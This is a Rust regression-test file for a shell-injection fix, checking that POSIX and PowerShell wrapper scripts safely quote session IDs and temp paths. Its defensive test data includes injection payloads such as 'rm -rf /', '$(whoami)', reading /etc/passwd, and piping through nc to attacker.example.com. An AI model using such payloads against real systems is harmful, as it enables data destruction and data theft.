//! Regression tests for C-003: shell command injection via state-file quoting.
//!
//! These tests ensure that malicious session IDs and temporary paths cannot
//! break out of the generated POSIX or PowerShell wrapper scripts.

use std::process::Command;

// The bash module is a private source file that depends on several crate-wide
// items. We provide minimal shims at the test root so the module compiles in
// this integration-test target, then pull the module in via `#[path]`.
mod shim {
    // Re-export the async-trait macro required by the `Tool` trait definition.
    pub use async_trait::async_trait;

    // Stub the tool result type.
    /// Stub tool output payload.
    #[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
    pub struct ToolOutput {
        /// Rendered tool output content.
        pub content: String,
        /// Optional structured metadata.
        pub metadata: Option<serde_json::Value>,
    } // Stub the canonical path cache used by the tool context.
    /// Stub canonical-path cache.
    #[derive(Clone, Copy, Default)]
    pub struct CanonicalPathCache;

    impl CanonicalPathCache {
        /// Create a stub cache.
        pub fn new() -> Self {
            CanonicalPathCache
        }
    }

    // Stub the tool context type.
    /// Stub tool execution context.
    #[derive(Clone)]
    pub struct ToolContext {
        /// Owning session identifier.
        pub session_id: String,
        /// Working directory for tool execution.
        pub working_dir: std::path::PathBuf,
        /// Event bus for shell notifications.
        pub event_bus: std::sync::Arc<crate::shim::event::EventBus>,
        /// Timestamps of file reads keyed by path.
        pub read_timestamps:
            std::sync::Arc<std::sync::RwLock<std::collections::HashMap<std::path::PathBuf, u64>>>,
        /// Canonical path cache.
        pub canonical_cache: std::sync::Arc<crate::shim::CanonicalPathCache>,
    }

    // Stub the tool trait. Only the type signature matters here; the actual
    // `execute` method is not exercised by these wrapper-quoting tests.
    /// Stub tool trait mirroring the real `Tool` signature.
    #[async_trait]
    pub trait Tool: Send + Sync {
        /// Tool name.
        fn name(&self) -> &str;
        /// Tool description.
        fn description(&self) -> &str;
        /// JSON schema for tool input.
        fn parameters_schema(&self) -> serde_json::Value;
        /// Permission category for the tool.
        fn permission_category(&self) -> &str;
        /// Execute the stub tool (unused by these tests).
        async fn execute(
            &self,
            input: serde_json::Value,
            ctx: &ToolContext,
        ) -> anyhow::Result<ToolOutput>;
    }
    /// Stub event bus and event enum used by the bash module.
    pub mod event {
        /// Stub event bus.
        #[derive(Clone)]
        pub struct EventBus;
        impl EventBus {
            /// Create a stub bus.
            pub fn new(_capacity: usize) -> EventBus {
                EventBus
            }
            /// Publish a stub event (no-op).
            pub fn publish(&self, _event: Event) {}
        }

        /// Stub event variant set.
        #[allow(dead_code)]
        #[derive(Clone)]
        pub enum Event {
            /// Shell working-directory change notice.
            ShellCwdChanged {
                /// Owning session id.
                session_id: String,
                /// New working directory.
                cwd: String,
            },
        }
    }

    // Stub resource module used for process concurrency gating.
    /// Stub process-concurrency resource module.
    pub mod resource {
        /// Held process permit.
        pub struct ProcessPermit;

        /// Acquire a stub process permit.
        pub async fn acquire_process_permit() -> anyhow::Result<ProcessPermit> {
            Ok(ProcessPermit)
        }
    }

    // Stub sanitization module used for secret redaction in tracing.
    /// Stub secret-redaction module.
    pub mod sanitize {
        /// Identity redaction for tests.
        pub fn redact_secrets(s: &str) -> String {
            s.to_string()
        }
    }

    // Stub askpass module used for sudo password prompting.
    /// Stub askpass broker module.
    pub mod askpass {
        /// Stub askpass broker.
        pub struct AskPassBroker;

        impl AskPassBroker {
            /// Start a stub broker (always returns None).
            pub fn start(_session_id: &str) -> Option<AskPassBroker> {
                None
            }
            /// Stub env vars (empty).
            pub fn env_vars(&self) -> Vec<(String, String)> {
                Vec::new()
            }
            /// Stub watcher spawn (no-op).
            pub fn spawn_watcher(
                &self,
                _session_id: String,
                _event_bus: std::sync::Arc<crate::shim::event::EventBus>,
            ) {
            }
            /// Stop the stub watcher (no-op).
            pub fn stop(&self) {}
        }
    }
}

// Re-export the shim items into the crate root so that the bash module's
// `super::{Tool, ToolContext, ToolOutput}` and `crate::{event, resource,
// sanitize, askpass}` imports resolve.
pub use shim::{CanonicalPathCache, Tool, ToolContext, ToolOutput};
/// Re-exported stub event module.
pub mod event {
    pub use crate::shim::event::*;
}
/// Re-exported stub resource module.
pub mod resource {
    pub use crate::shim::resource::*;
}
/// Re-exported stub sanitize module.
pub mod sanitize {
    pub use crate::shim::sanitize::*;
}
/// Re-exported stub askpass module.
pub mod askpass {
    pub use crate::shim::askpass::*;
}

// Now pull in the private source module so its wrapper builders and quoting
// helpers are available to the tests.
#[path = "../src/bash.rs"]
mod bash;

use bash::{build_posix_wrapper, build_powershell_wrapper, ps_quote_single, sh_quote_single};

/// A collection of payloads that an attacker might embed in a session ID or
/// temp-directory name to try to terminate a quoted string or inject commands.
fn malicious_path_payloads() -> Vec<&'static str> {
    vec![
        "'; rm -rf _; '",
        "`whoami`",
        "$(whoami)",
        "it's a trap",
        "\"; evil; \"",
        "; cat /etc/passwd; ",
        "| nc attacker.example.com 1234 |",
        "> /dev/null",
        "< /etc/passwd",
    ]
}

#[test]
fn test_sh_quote_single_escapes_quotes() {
    assert_eq!(sh_quote_single("hello"), "'hello'");
    assert_eq!(sh_quote_single("it's a trap"), "'it'\\''s a trap'");

    let payload = "'; rm -rf /; '";
    let expected = format!("'{}'", payload.replace('\'', "'\\''"));
    assert_eq!(sh_quote_single(payload), expected);
}

#[test]
fn test_ps_quote_single_escapes_quotes() {
    assert_eq!(ps_quote_single("hello"), "'hello'");
    assert_eq!(ps_quote_single("it's a trap"), "'it''s a trap'");

    let payload = "'; rm -rf /; '";
    let expected = format!("'{}'", payload.replace('\'', "''"));
    assert_eq!(ps_quote_single(payload), expected);
}

#[test]
fn test_posix_wrapper_with_malicious_paths_is_syntax_valid() {
    for payload in malicious_path_payloads() {
        let state = format!("/tmp/ragent_shell_{payload}.state");
        let script = format!("/tmp/ragent_cmd_{payload}_12345.sh");
        let wrapper = build_posix_wrapper(&state, &script);

        // The wrapper must be parseable by bash without syntax errors.
        let output = Command::new("bash")
            .arg("-n")
            .arg("-c")
            .arg(&wrapper)
            .output()
            .expect("bash should be available");

        assert!(
            output.status.success(),
            "POSIX wrapper should be syntactically valid even with malicious path {payload:?}\n\
             stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
}

#[test]
fn test_posix_wrapper_executes_with_malicious_path_names() {
    // Create files whose names contain shell metacharacters. The wrapper must
    // treat them as literal paths, not execute the embedded shell syntax.
    let tmp = tempfile::tempdir().expect("tempdir");
    let payloads = ["'; rm -rf _; '", "`whoami`", "$(whoami)", "; echo pwned; "];
    for payload in payloads {
        let state = tmp.path().join(format!("ragent_shell_{payload}.state"));
        let script = tmp.path().join(format!("ragent_cmd_{payload}.sh"));

        std::fs::write(&script, "echo 'escaped ok'").expect("write script");

        let wrapper = build_posix_wrapper(
            state.to_str().expect("state path"),
            script.to_str().expect("script path"),
        );

        let output = Command::new("bash")
            .arg("-c")
            .arg(&wrapper)
            .output()
            .expect("bash should be available");

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        assert!(
            output.status.success(),
            "POSIX wrapper should execute safely with path {payload:?}\nstdout: {stdout}\nstderr: {stderr}"
        );
        assert!(
            stdout.contains("escaped ok"),
            "POSIX wrapper should run the embedded script for path {payload:?}: stdout={stdout}"
        );

        // The script file should be cleaned up; the state file may be created.
        assert!(
            !script.exists(),
            "wrapper should clean up script file for {payload:?}"
        );
    }
}

#[test]
fn test_posix_wrapper_uses_single_quoted_assignments() {
    let state = "/tmp/ragent_shell_test.state";
    let script = "/tmp/ragent_cmd_test_12345.sh";
    let wrapper = build_posix_wrapper(state, script);

    // Assignments use the safe single-quoted form.
    assert!(wrapper.contains(&format!("STATE_FILE={}", sh_quote_single(state))));
    assert!(wrapper.contains(&format!("SCRIPT_FILE={}", sh_quote_single(script))));
}

#[test]
fn test_posix_wrapper_executes_harmless_command() {
    // Build a temporary directory tree under the current working directory so
    // path-containment checks in other tests do not interfere.
    let tmp = tempfile::tempdir().expect("tempdir");
    let state = tmp.path().join("ragent_shell_test.state");
    let script = tmp.path().join("ragent_cmd_test.sh");

    std::fs::write(&script, "echo 'hello from script'").expect("write script");

    let wrapper = build_posix_wrapper(
        state.to_str().expect("state path"),
        script.to_str().expect("script path"),
    );

    let output = Command::new("bash")
        .arg("-c")
        .arg(&wrapper)
        .output()
        .expect("bash should be available");

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("hello from script"),
        "POSIX wrapper should run the embedded script: stdout={stdout}"
    );
    assert!(
        output.status.success(),
        "POSIX wrapper exit code should be 0"
    );

    // Script file should be removed by the wrapper.
    assert!(!script.exists(), "wrapper should clean up script file");
}

#[test]
fn test_posix_wrapper_with_quoted_paths_executes_harmless_command() {
    // Construct paths containing a single quote, which is the character the
    // wrapper must escape correctly.
    let tmp = tempfile::tempdir().expect("tempdir");
    let state = tmp.path().join("ragent_shell_test's.state");
    let script = tmp.path().join("ragent_cmd_test's.sh");

    std::fs::write(&script, "echo 'quoted path ok'").expect("write script");

    let wrapper = build_posix_wrapper(
        state.to_str().expect("state path"),
        script.to_str().expect("script path"),
    );

    let output = Command::new("bash")
        .arg("-c")
        .arg(&wrapper)
        .output()
        .expect("bash should be available");

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("quoted path ok"),
        "POSIX wrapper should handle single quotes in paths: stdout={stdout}"
    );
    assert!(
        output.status.success(),
        "POSIX wrapper exit code should be 0"
    );
    assert!(!script.exists(), "wrapper should clean up script file");
}

#[test]
fn test_powershell_wrapper_escapes_single_quotes_in_paths() {
    for payload in malicious_path_payloads() {
        let state = format!("C:/ragent_shell_{payload}.state");
        let script = format!("C:/ragent_cmd_{payload}_12345.ps1");
        let wrapper = build_powershell_wrapper(&state, &script);

        // The escaped file paths must appear as single-quoted PowerShell
        // literals. We check this by looking for the escaped assignment form
        // rather than the raw payload, because a correctly escaped path still
        // contains the original characters inside the doubled quotes.
        let expected_state = format!("$StateFile = {}", ps_quote_single(&state));
        let expected_script = format!("$UserCmd = Get-Content -Raw {}", ps_quote_single(&script));
        assert!(
            wrapper.contains(&expected_state),
            "PowerShell wrapper should contain escaped state assignment for path {payload:?}"
        );
        assert!(
            wrapper.contains(&expected_script),
            "PowerShell wrapper should contain escaped script assignment for path {payload:?}"
        );
    }
}

#[test]
fn test_powershell_wrapper_uses_single_quoted_assignments() {
    let state = "C:/ragent_shell_test.state";
    let script = "C:/ragent_cmd_test_12345.ps1";
    let wrapper = build_powershell_wrapper(state, script);

    assert!(wrapper.contains(&format!("$StateFile = {}", ps_quote_single(state))));
    assert!(wrapper.contains(&format!(
        "$UserCmd = Get-Content -Raw {}",
        ps_quote_single(script)
    )));
    assert!(wrapper.contains(&format!(
        "Remove-Item -Force {} -ErrorAction SilentlyContinue",
        ps_quote_single(script)
    )));
}

#[test]
fn test_safe_session_id_defangs_injection_chars() {
    use bash::safe_session_id;

    // Characters that could be used to break out of paths are replaced with `_`.
    assert_eq!(safe_session_id("abc'; rm -rf /; '"), "abc___rm_-rf_____");
    assert_eq!(safe_session_id("abc\n123"), "abc_123");
    assert_eq!(safe_session_id("abc/123"), "abc_123");
    assert_eq!(safe_session_id("abc\\123"), "abc_123");
    assert_eq!(safe_session_id("abc`123"), "abc_123");
    assert_eq!(safe_session_id("abc$(123)"), "abc__123_");
}
